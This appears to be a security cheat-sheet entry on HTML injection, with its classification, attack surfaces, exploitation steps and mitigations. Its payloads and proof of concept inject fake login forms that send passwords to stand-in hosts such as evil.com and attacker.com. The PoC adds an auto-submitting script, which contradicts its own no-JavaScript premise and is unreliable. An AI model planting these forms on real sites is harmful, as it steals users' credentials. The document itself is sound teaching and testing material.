📌 HTML Injection

🧠 Description

What is HTML Injection?

HTML injection occurs when user input is reflected in the page without proper encoding, allowing an attacker to inject arbitrary HTML markup. Unlike XSS, the attacker cannot execute JavaScript (if the injection point is safe from script execution), but they can inject headings, images, forms, and links. This is dangerous for phishing – an attacker can inject a fake login form into a legitimate trusted page, stealing credentials from unsuspecting users who trust the domain.

Security principle violated: Output Encoding

🏷️ Classification

  • Type: Injection
  • OWASP: A03:2021 – Injection
  • CWE: CWE-79 (subset) / CWE-80

🎯 Attack Surface

  • ✅ Search boxes where the query term is reflected
  • ✅ Comment/feedback fields
  • ✅ Profile name / display name fields
  • ✅ Error messages that reflect user input

💣 Basic Payloads

<h1>Injected Heading</h1>
<img src="https://evil.com/fake.png">
<a href="https://evil.com">Click here</a>
<form action="https://evil.com/steal"><input type="password"><input type="submit"></form>

⚙️ Exploitation Steps

  1. Identify any input that is later displayed on the page (search term, comment, profile name).
  2. Inject a simple HTML tag, e.g., <h1>Test</h1>.
  3. If the heading appears as formatted, HTML injection is confirmed.
  4. To demonstrate impact, inject a fake login form pointing to an external server. If the form renders, take a screenshot as proof of concept.

🛡️ Mitigation

✅ Always HTML‑encode user input before reflecting it (use htmlspecialchars() in PHP, equivalent in other frameworks)
✅ Use a Content Security Policy to restrict form actions
✅ Validate input to reject HTML tags if not needed

📎 Proof of Concept (PoC)

<form action="https://attacker.com/steal" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Login">
</form>
<script>document.forms[0].submit();</script>
